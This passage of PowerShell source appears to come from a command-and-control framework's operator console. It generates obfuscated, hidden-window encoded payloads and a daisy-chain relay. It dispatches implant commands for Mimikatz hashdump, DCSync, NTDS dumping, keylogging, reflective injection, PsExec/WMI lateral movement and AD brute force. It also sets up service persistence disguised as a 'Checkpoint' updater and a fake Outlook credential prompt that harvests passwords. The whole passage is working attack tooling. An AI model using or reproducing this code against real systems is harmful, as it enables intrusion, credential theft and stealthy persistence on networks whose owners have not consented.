        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$Server`$url", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)

$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
$payload = $payloadraw -replace "`n", ""

if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
} 
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
} else {
    Write-Host "Cannot create payload"
}
$rundaisy = @"
`$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
if (!`$t) { 
    if (Test-Administrator) { 
        start-job -ScriptBlock {$NewScript} | Out-Null 
    }
}

"@
[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green

return $rundaisy
}

function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Upload-File
{
    param
    (
        [string] $Source,
        [string] $Destination
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    "Upload-File -Destination '$Destination' -Base64 $base64"
    $reader.Dispose()
}
function CheckModuleLoaded {
    param
    (
    [string] $ModuleName,
    [string] $IMRandomURI
    )
    $ModuleName = $ModuleName.ToLower();
    $modsloaded = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$IMRandomURI'" -As SingleValue
    if (!$modsloaded.contains("$ModuleName")){
        $modsloaded = $modsloaded + " $ModuleName"
        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='$modsloaded' WHERE RandomURI='$IMRandomURI'"|Out-Null
        $query = "INSERT INTO NewTasks (RandomURI, Command)
        VALUES (@RandomURI, @Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
            RandomURI = $IMRandomURI
            Command   = "LoadModule $ModuleName"
        } | Out-Null
    }
}

function Add-Creds {
    param
    (
    [string] $Username,
    [string] $Password,
    [string] $Hash
    )
    if (($Username) -or ($Password)){
        Invoke-SqliteQuery -DataSource $Database -Query "INSERT INTO Creds (username, password, hash) VALUES ('$username','$password','$hash')"|Out-Null
    } else {
        Write-Host "No username or password specified. Please complete both arguments."
    }
}

function Search-Creds {
    param
    (
    [string] $Username,
    [string] $Password,
    [string] $Hash
    )
        if ($Username){
            $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds WHERE username LIKE '$username'" -As PSObject
            Write-Output -InputObject $dbResult | ft -AutoSize | Out-Host
        } else {
            Write-Host "No username specified. Please complete all necessary arguments."
        }
}

function Del-Creds {
    param
    (
    [string] $credsID
    )
    if ($credsID){
        $dbResult = Invoke-SqliteQuery -Datasource $database -Query "SELECT credsid, username FROM Creds Where CredsID == '$credsID'" -As DataRow
        Write-Host "The following user credential will be deleted from the database:"
        Write-Host "ID: " $dbResult.Item(0)
        Write-Host "User: " $dbResult.Item(1)
        $caption = "Delete Credentials from Database?";
        $message = "Please Confirm:";
        $yes = new-Object System.Management.Automation.Host.ChoiceDescription "&Yes","YES";
        $no = new-Object System.Management.Automation.Host.ChoiceDescription "&No","NO";
        $choices = [System.Management.Automation.Host.ChoiceDescription[]]($yes,$no);
        $answer = $host.ui.PromptForChoice($caption,$message,$choices,0)

        switch ($answer){
            0 {Write-Host "Deleting Credentials"; Invoke-SqliteQuery -Datasource $database -Query "DELETE FROM Creds Where CredsID == '$credsID'" | out-null; break}
            1 {Write-Host "Cancel selected, no changes made"; break}
        }
    } else {
        Write-Host "No CredID specified. Please complete all necessary arguments."
    }
}

# run startup function
startup

function runcommand {

param
(
[string] $pscommand,
[string] $psrandomuri
)
# alias list
            if ($pscommand.ToLower().StartsWith('load-module'))
            { 
                $pscommand = $pscommand -replace "load-module","loadmodule"
            }
            if ($pscommand)
            { 
                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
            }
            if ($pscommand -eq 'Get-ExternalIP') 
            {
                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
            }  
            if ($pscommand -eq 'getuid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }  
            if ($pscommand -eq 'ps') 
            {
                $pscommand = 'get-processfull'
            }
            if ($pscommand -eq 'id') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'whoami') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Kill-Implant') 
            {
                $pscommand = 'exit'
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
            }
            if ($pscommand -eq 'Show-ServerInfo') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                Write-Host $dbresult
            }
            if ($pscommand -eq 'get-pid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'ListModules') 
            {
                $pscommand = $null
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        Write-Host $mod
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  Write-Host $mod
                }
                
                Write-Host -Object ""
            }  
            if ($pscommand -eq 'ModulesLoaded') 
            {
                $pscommand = $null
                $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $mods
            }
            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
            {
                $pscommand = "sc.exe delete CPUpdater"       
            }
            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
            }
            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
            {
                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run Invoke-DaisyChain first"
                    $pscommand = $null
                }
            }            
            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$payload'"
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('hashdump'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                $pscommand = "Invoke-Mimikatz -Command `'`"lsadump::sam`"`'"
            }
            if ($pscommand.ToLower().StartsWith('get-wlanpass'))
            { 
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
            { 
                CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-firewall'))
            { 
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-x86'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"

            }
            if ($pscommand.ToLower().StartsWith('migrate-x64'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'invoke-psinject-payload',''
                $pscommand = "invoke-reflectivepeinjection $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
            { 
                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-bloodhounddata'))
            { 
                CheckModuleLoaded "bloodhound.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sniffer'))
            { 
                CheckModuleLoaded "invoke-sniffer.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('test-adcredential'))
            { 
                CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
            { 
                CheckModuleLoaded "Powerup.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
            { 
                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
            { 
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
            { 
                CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "Inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('new-zipfile'))
            { 
                CheckModuleLoaded "Zippy.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smblogin'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiexec'))
            { 
                CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-pipekat'))
            { 
                CheckModuleLoaded "Invoke-Pipekat.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-net'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mapdomaintrust'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-kerb'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
            { 
                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
            { 
                CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
            { 
                CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
            }
            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
            { 
                CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
            { 
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
            { 
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-wmicommand'))
            {
                CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('dump-ntds'))
            {
                CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-ad'))
            {
                CheckModuleLoaded "brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-locadmin'))
            {
                CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-passpol'))
            {
                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-locadm'))
            {
                CheckModuleLoaded "get-locadm.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-runas'))
            {
                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-shellcode'))
            {
                CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-pass-notexp'))
            {
                CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-winrmsession'))
            {
                CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-computerinfo'))
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-enum')) 
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
                CheckModuleLoaded "POwerup.ps1" $psrandomuri
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Netstat -anp tcp; Netstat -anp udp; Net share; Ipconfig; Net view; Net users; Net localgroup administrators; Net accounts; Net accounts dom;"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Proxy; Invoke-allchecks; Get-MShotfixes"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Firewallrulesall | out-string -width 200"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Screenshot"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-GPPPassword"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-WmiObject -Class Win32_Product"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" -Name CachedLogonsCount"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`""
                } | Out-Null
                
                $pscommand = "Get-RecentFiles; Get-WLANPass"

            }
            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runaspayload', ''
                $pscommand = "invoke-runaspayload $($pscommand)"
                
            }     
            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
            { 
            if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"     
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = '$proxypayload = "'+$proxypayload+'"'
                } | Out-Null
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
                $pscommand = "invoke-runasproxypayload $($pscommand)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }         
            if (($pscommand -eq 'StartAnotherImplantWithProxy') -or ($pscommand -eq 'saiwp'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('get-proxy')) 
            {
                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
            }
            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('upload-file')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createpayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'cred-popper') 
            {
                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
            }
            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
            {
                $pscommand = $pscommand -replace 'set-beacon ', ''
                $pscommand = $pscommand -replace 'sleep ', ''
                $pscommand = $pscommand -replace 'beacon ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = '$sleeptime = '+$newsleep
                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    Sleep = $newsleep
                    RandomURI = $psrandomuri
                } | Out-Null
            }
